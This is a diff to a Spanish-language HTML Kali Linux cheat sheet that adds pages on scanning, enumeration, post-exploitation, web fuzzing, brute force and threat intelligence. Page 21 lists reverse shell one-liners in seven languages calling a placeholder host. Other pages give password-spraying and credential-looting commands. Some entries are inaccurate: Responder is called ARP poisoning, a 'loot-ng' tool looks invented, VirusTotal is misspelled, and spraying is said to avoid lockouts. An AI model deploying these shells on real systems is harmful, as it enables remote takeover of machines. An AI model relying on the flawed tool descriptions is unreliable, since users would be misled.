@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Manual de Kali Linux</title>
+    <title>Manual de Kali Linux y Herramientas de Seguridad</title>
     <link rel="stylesheet" href="../CSS/style.css" />
     <link rel="stylesheet" href="../CSS/Manual-optimized.css" />
   </head>
@@ -75,6 +75,7 @@
           <button class="cat-btn">Foro</button>
         </a>
       </nav>
+      </nav>
     </aside>
 
     <!-- Carpeta Cerrada -->
@@ -89,6 +90,7 @@
     <!-- Contenido del Manual Abierto -->
     <div id="main-content" class="book-wrapper" style="display: none">
       <button class="close-book-btn" onclick="closeBook()">CERRAR ✖</button>
+      <span id="page-indicator" class="page-indicator"></span>
 
       <div class="nav-controls">
         <button
@@ -111,9 +113,11 @@
                 cualquier profesional de la seguridad. Sin embargo, memorizar
                 tantos comandos o buscarlos individualmente puede ser un
                 desafío. Por eso, en DistroVantix hemos preparado esta guía de
-                referencia rápida.
+                referencia rápida que incluye: herramientas de reconocimiento,
+                explotación, post-explotación, fuzzing, análisis forense,
+                ingeniería inversa y reverse shells por lenguaje.
               </p>
-              <small>DistroVantix - Guía de Referencia Rápida</small>
+              <small>DistroVantix - Guía de Referencia Rápida (23 páginas)</small>
             </div>
           </div>
 
@@ -756,6 +760,210 @@
               </p>
               <p>
                 <strong>ghidra</strong> Suite de ingeniería inversa desarrollada por la NSA (requiere entorno gráfico).
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 18: Escaneo de Red Avanzado -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Escaneo de Red Rápido</h2>
+              <p>
+                <strong>masscan [red] -p [puertos] --rate=[num]</strong> Escaneo de puertos masivo a millones de paquetes por segundo (alternativa a nmap).
+              </p>
+              <p>
+                <strong>nmap -p- --min-rate 5000 [IP]</strong> Escaneo de todos los 65535 puertos con velocidad forzada.
+              </p>
+              <p>
+                <strong>nmap -A -T4 [IP]</strong> Escaneo completo: detección de SO, versiones, scripts y traceroute.
+              </p>
+              <p>
+                <strong>nmap --script vuln [IP]</strong> Ejecuta scripts de vulnerabilidades conocidas contra el objetivo.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Enumeración Avanzada</h2>
+              <p>
+                <strong>enum4linux-ng -A [IP]</strong> Enumeración completa de Windows y Samba (versión mejorada de enum4linux).
+              </p>
+              <p>
+                <strong>responder -I [int] -wrf</strong> Ataque de envenenamiento de ARP y NBNS para capturar hashes en red local.
+              </p>
+              <p>
+                <strong>crackmapexec smb [red] --users [archivo]</strong> Spray de contraseñas masivo sobre SMB sin bloqueo de cuentas.
+              </p>
+              <p>
+                <strong>nmap -sU --top-ports 100 [IP]</strong> Escaneo de los puertos UDP más comunes.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 19: Post-Explotación Avanzado y Escalada -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Herramientas Post-Explotación</h2>
+              <p>
+                <strong>impacket-wmiexec [user]:[pass]@[IP]</strong> Ejecución remota de comandos en Windows usando WMI.
+              </p>
+              <p>
+                <strong>evil-winrm -i [IP] -u [user] -p [pass] -s [scripts]</strong> Conexión WinRM con carga de scripts PowerShell.
+              </p>
+              <p>
+                <strong>chisel client [IP]:[puerto] [local]:[remote]</strong> Cliente Chisel para crear túneles desde la máquina víctima.
+              </p>
+              <p>
+                <strong>ligolo-ng proxy</strong> Proxy reverso alternativo a Chisel, sin necesidad de SOCKS.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Escalada de Privilegios</h2>
+              <p>
+                <strong>linpeas.sh</strong> Script de enumeración automática de vector de escalada en Linux.
+              </p>
+              <p>
+                <strong>winpeas.exe</strong> Versión de Windows de la herramienta de escalada automática.
+              </p>
+              <p>
+                <strong>gtfobins.github.io</strong> Base de datos de binaries, scripts y librerías explotables con sudo/SUID.
+              </p>
+              <p>
+                <strong>loot-ng [IP]</strong> Herramienta que recopila credenciales, tokens y configuraciones de la máquina comprometida.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 20: Hacking Web y API Testing -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Testing de Aplicaciones Web</h2>
+              <p>
+                <strong>burpsuite</strong> Proxy interceptador y suite completa para pruebas de seguridad web.
+              </p>
+              <p>
+                <strong>ffuf -u [URL]/FUZZ -w [wordlist] -mc 200</strong> Fuzzing ultrarrápido con filtro de códigos de respuesta.
+              </p>
+              <p>
+                <strong> nuclei -u [URL] -t [templates]</strong> Escáner de vulnerabilidades basado en plantillas comunitarias.
+              </p>
+              <p>
+                <strong>httpx -l [lista] -sc -title -tech-detect</strong> HTTP prober masivo: detecta status, title y tecnologías.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>API y Autenticación</h2>
+              <p>
+                <strong>arjun -u [URL]</strong> Descubre parámetros ocultos en endpoints de aplicaciones web.
+              </p>
+              <p>
+                <strong>jwt_tool [token]</strong> Herramienta para analizar, explotar y manipular tokens JWT.
+              </p>
+              <p>
+                <strong>ffuf -u [URL] -X POST -d "user=admin&pass=FUZZ" -w [wordlist]</strong> Fuerza bruta sobre parámetros POST.
+              </p>
+              <p>
+                <strong>typo3scan -d [URL]</strong> Escáner de versiones y plugins de CMS TYPO3.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 21: Shells - Reverse Shells por Lenguajes -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Reverse Shells Linux</h2>
+              <p>
+                <strong>bash -i >& /dev/tcp/[IP]/[port] 0>&1</strong> Bash reversa interactiva básica.
+              </p>
+              <p>
+                <strong>nc -e /bin/sh [IP] [port]</strong> Netcat con ejecución de shell reversa.
+              </p>
+              <p>
+                <strong>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[IP]",[port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</strong> Python con spawn de TTY completo.
+              </p>
+              <p>
+                <strong>perl -e 'use Socket;$i="[IP]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}'</strong> Perl reversa sin dependencias.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Reverse Shells Web</h2>
+              <p>
+                <strong>php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'</strong> PHP inversa clásica.
+              </p>
+              <p>
+                <strong>ruby -rsocket -e'f=TCPSocket.open("[IP]",[port]);while(cmd=f.gets);IO.popen(cmd,"r"){|io|f.write io.read}end'</strong> Ruby socket reversa.
+              </p>
+              <p>
+                <strong>lua -e "require('socket');require('os');t=socket.tcp();t:connect('[IP]','[port]');os.execute('/bin/sh -i <&3 >&3 2>&3');"</strong> Lua inversa ligera.
+              </p>
+              <p>
+                <strong>mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [IP] [port] > /tmp/f</strong> Netcat con mkfifo (sin -e).
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 22: Fuzzing y Automatización de Ataques -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Fuzzing Web Avanzado</h2>
+              <p>
+                <strong>ffuf -u [URL]/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fs 0</strong> Fuzzing con filtro de tamaño para eliminar falsos positivos.
+              </p>
+              <p>
+                <strong>gobuster dir -u [URL] -w [wordlist] -x php,html,txt -t 50</strong> Enumeración con extensiones múltiples y 50 hilos.
+              </p>
+              <p>
+                <strong>feroxbuster -u [URL] -w [wordlist] --depth 3</strong> Scanner de directorios recursivo escrito en Rust.
+              </p>
+              <p>
+                <strong>wfuzz -c -z file,[wordlist] --hc 404 [URL]/FUZZ</strong> Oculta respuestas con código 404 para ver solo rutas válidas.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Brute Force y Spraying</h2>
+              <p>
+                <strong>hydra -l [user] -P /usr/share/wordlists/rockyou.txt [IP] ssh</strong> Fuerza bruta contra servicios SSH con diccionario.
+              </p>
+              <p>
+                <strong>medusa -h [IP] -u [user] -P [wordlist] -M ssh</strong> Alternativa a Hydra con soporte de módulos paralelos.
+              </p>
+              <p>
+                <strong>crackmapexec smb [red] -u [users.txt] -p [pass.txt] --continue-on-success</strong> Password spraying masivo sin bloqueo de cuentas en Active Directory.
+              </p>
+              <p>
+                <strong>crowbar -b [protocol] -s [IP/32] -u [user] -C [wordlist]</strong> Herramienta de fuerza bruta para RDP, SSH y VNC.
+              </p>
+            </div>
+          </div>
+
+          <!-- Página 23: Análisis de Malware y Threat Intelligence -->
+          <div class="spread">
+            <div class="page left-page">
+              <h2>Análisis de Archivos Sospechosos</h2>
+              <p>
+                <strong>file [archivo]</strong> Detecta el tipo de archivo real inspeccionando los magic bytes (no la extensión).
+              </p>
+              <p>
+                <strong>sha256sum [archivo]</strong> Genera el hash SHA-256 del archivo para buscarlo en VirusTotal y bases de hashes.
+              </p>
+              <p>
+                <strong>strings [archivo] | head -20</strong> Extrae las primeras cadenas de texto legibles de un binario sospechoso.
+              </p>
+              <p>
+                <strong>yara [regla.yar] [archivo]</strong> Motor de reglas YARA para clasificar y detectar patrones de malware.
+              </p>
+            </div>
+            <div class="page right-page">
+              <h2>Threat Intelligence</h2>
+              <p>
+                <strong>shodan search [query]</strong> Motor de búsqueda de Shodan desde terminal para descubrir dispositivos expuestos.
+              </p>
+              <p>
+                <strong>censys search [query]</strong> Alternativa a Shodan con más datos de hosts y certificados TLS.
+              </p>
+              <p>
+                <strong>virusotal [hash]</strong> Consulta hashes en la API de VirusTotal para detectar malware conocido.
+              </p>
+              <p>
+                <strong>maltego</strong> Plataforma gráfica de análisis de relaciones y correlación de datos de inteligencia.
               </p>
             </div>
           </div>
